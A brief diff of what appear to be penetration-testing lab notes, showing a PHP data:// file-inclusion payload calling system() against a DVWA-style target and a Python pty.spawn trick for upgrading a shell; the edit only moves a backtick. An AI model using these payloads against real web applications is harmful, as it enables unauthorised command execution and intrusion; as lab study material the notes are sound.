@@ -74,5 +74,6 @@ http://10.0.2.100/vulnerabilities/fi/?page=data://text/plain,<?php system('TARGE
 
 
 ## Propper shell  
-`echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py`
+`echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
+`
 `python3 /tmp/asdf.py`
